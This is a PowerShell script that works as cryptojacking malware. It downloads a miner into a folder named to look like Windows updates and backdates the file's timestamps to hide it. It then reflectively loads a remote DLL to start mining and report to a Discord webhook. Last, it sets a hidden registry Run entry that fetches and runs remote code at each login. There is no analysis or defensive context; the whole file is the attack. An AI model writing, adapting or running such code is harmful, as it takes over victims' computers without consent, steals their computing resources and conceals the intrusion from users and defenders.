# --- CONFIGURATION ---
$GithubUser = "HolyV200"
$RepoName = "ultaV2"
$DllUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/Bridge.dll"
$Wallet = "1871092382" # Mining Key
$Webhook = "https://discord.com/api/webhooks/1496175376966090855/I_Dn3uZ1clrG-J3XR-T0LRnUo6HKP6u8Ww2j7iut7mcKIZHSyWBzOEwZODtGR3zdAQlK"

# --- STEALTH SETUP ---
Write-Host "Running..."
$StealthDir = "$env:LOCALAPPDATA\WinSysUpdates"
if (-not (Test-Path $StealthDir)) {
    New-Item -ItemType Directory -Force -Path $StealthDir | Out-Null
}

$CpuExe = Join-Path $StealthDir "win_sys_x.exe"
$GpuExe = Join-Path $StealthDir "win_sys_g.exe"

$wc = New-Object System.Net.WebClient
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# 1. Handle CPU Miner (DIRECT DOWNLOAD + TIMESTOMP)
if (-not (Test-Path $CpuExe)) {
    try {
        $RawMinerUrl = "https://github.com/$GithubUser/$RepoName/raw/main/win_sys_x.exe"
        $wc.DownloadFile($RawMinerUrl, $CpuExe)
        $OldDate = Get-Date -Year 2019 -Month 5 -Day 14
        (Get-Item $CpuExe).CreationTime = $OldDate
        (Get-Item $CpuExe).LastWriteTime = $OldDate
    } catch { }
}

# 2. Detect GPUs
$NvidiaGpu = $null
$AmdGpu = $null
try {
    $vcs = Get-CimInstance Win32_VideoController -ErrorAction SilentlyContinue
    foreach ($vc in $vcs) {
        if ($vc.Name -match "NVIDIA" -or $vc.PNPDeviceID -match "VEN_10DE") { $NvidiaGpu = $true }
        if ($vc.Name -match "AMD" -or $vc.Name -match "Radeon" -or $vc.PNPDeviceID -match "VEN_1002") { $AmdGpu = $true }
    }
} catch { }

# --- REFLECTIVE LOADING ---
try {
    $dllBytes = $wc.DownloadData($DllUrl)
    $assembly = [System.Reflection.Assembly]::Load($dllBytes)
    $loader = $assembly.GetTypes() | Where-Object { $_.Name -eq "DateFundLoader" } | Select-Object -First 1
    $startMethod = $loader.GetMethod("StartMiner", [Type[]]@([string]))
    $GpuArg = if ($NvidiaGpu -or $AmdGpu) { $GpuExe } else { "" }
    $IsAmd = if ($AmdGpu) { "true" } else { "false" }
    $combinedArgs = "$CpuExe|$GpuArg|$Wallet|$IsAmd|$Webhook"
    $startMethod.Invoke($null, @([string]$combinedArgs))
} catch { }

# --- USER-MODE PERSISTENCE (NO ADMIN NEEDED) ---
try {
    $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $Payload = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command `"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/$GithubUser/$RepoName/main/remote_deploy.ps1')`""
    Set-ItemProperty -Path $RunKey -Name "WindowsUpdateManager" -Value $Payload
} catch { }
